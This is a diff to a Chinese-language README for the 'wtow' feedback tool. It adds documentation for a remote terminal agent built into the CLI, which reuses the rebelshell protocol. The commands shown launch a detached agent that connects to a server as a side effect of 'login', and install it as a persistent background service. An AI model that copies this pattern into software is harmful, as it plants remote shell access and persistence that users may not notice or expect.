@@ -11,7 +11,8 @@ apps/server/      HTTP 服务；src/api/ 按领域分模块，src/config.rs 统�
                   migrations/ 是数据库迁移，assets/ 是安装脚本与下载页
 apps/web/         Web 管理台（React 19 + Vite + Tailwind CSS 4 + Radix UI），
                   构建产物 apps/web/dist 由 rust-embed 打进服务端二进制
-apps/cli/         wtow 命令行，Skill 文件在 apps/cli/skill 下，编译时打进二进制
+apps/cli/         wtow 命令行，Skill 文件在 apps/cli/skill 下，编译时打进二进制；
+                  src/agent/ 是内置的反馈终端通道（直接复用 rebelshell 协议）
 crates/contract/  服务端与 CLI 共用的 DTO 和错误码，也是前端 TS 类型的来源
 packages/ui/      Web 组件库
 packages/shared/  TS 类型，src/bindings 由 ts-rs 从 crates/contract 生成
@@ -115,6 +116,34 @@ bun run smoke
    ```
 
 CLI 读取配置的优先级：命令行参数 > 环境变量（`WTOW_BASE_URL` / `WTOW_PROJECT` / `WTOW_TOKEN`）> 仓库内的 `.wtow.toml` > 用户配置中当前启用的 profile。完整命令和退出码见 `apps/cli/skill/references/cli.md`。
+
+## 反馈终端（内置在 CLI 里）
+
+反馈中心不仅能收反馈，还能在同一条通道上连回出问题的那台机器。这条通道直接复刻
+rebelshell 客户端的协议与实现，**内置在 `wtow` 可执行文件里**，不需要再分发第二个二进制；
+服务端就是现成的 rebelshell 服务端。
+
+```bash
+# 登录时顺手把 Agent 拉到后台（wtow 退出后连接仍在）
+wtow login --base-url https://wtow.internal --project demo --token wtow_pat_xxx \
+           --rebelshell-server 10.0.0.5:9705
+
+# 需要开机自启时，再装成后台服务（Windows 需管理员，Linux 需 root）
+wtow agent install --server 10.0.0.5:9705
+wtow agent uninstall
+
+# 前台调试
+wtow agent run --server 10.0.0.5:9705
+```
+
+- 反馈中心地址按 `--rebelshell-server` > `WTOW_REBELSHELL_SERVER` > 上次登录保存的值解析；
+  登录时只保存，不强制校验。
+- 后台实例与终端脱钩（Windows 用 `DETACHED_PROCESS`，Unix 用 `setsid`），日志写入
+  `<配置目录>/wtow/agent.log`。重复登录会再拉一个实例，没有关系：同一设备 UUID 重连时
+  服务端会踢掉旧连接。
+- 设备 UUID 存在 `<配置目录>/wtow/agent-id`，与 rebelshell 客户端位置一致。
+- Web 与 CLI 提交反馈时都会附带 `client_context`：浏览器侧是 UA、视口、语言、时区、网络；
+  CLI 侧是主机名、系统、设备 UUID 与 CLI 版本。反馈中心据此定位可诊断的机器。
 
 ## 发布 CLI
 
